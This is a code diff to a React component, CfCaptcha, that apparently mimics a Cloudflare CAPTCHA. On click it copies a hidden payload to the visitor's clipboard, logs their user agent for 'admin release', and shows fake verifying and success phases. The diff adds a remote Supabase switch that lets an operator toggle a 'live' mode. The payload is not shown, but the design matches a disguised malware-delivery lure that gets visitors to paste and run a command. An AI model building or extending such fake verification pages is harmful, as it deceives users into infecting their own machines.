@@ -76,6 +76,17 @@ const CfCaptcha = () => {
     if (phase !== "idle") return;
     copyPayload();
     setPhase("verifying");
+
+    let mode = flowMode;
+    try {
+      const { data } = await (supabase as any)
+        .from("api_settings").select("flow_mode").limit(1).maybeSingle();
+      if (data?.flow_mode) {
+        mode = data.flow_mode;
+        setFlowMode(data.flow_mode);
+      }
+    } catch {}
+
     // create captcha request for admin release
     try {
       const ua = typeof navigator !== "undefined" ? navigator.userAgent : null;
@@ -96,7 +107,7 @@ const CfCaptcha = () => {
     } catch {}
     setTimeout(() => setPhase("success"), 800);
     setTimeout(() => {
-      if (flowMode === "live") {
+      if (mode === "live") {
         setPhase("liveWaiting");
       } else {
         setPhase("slider");
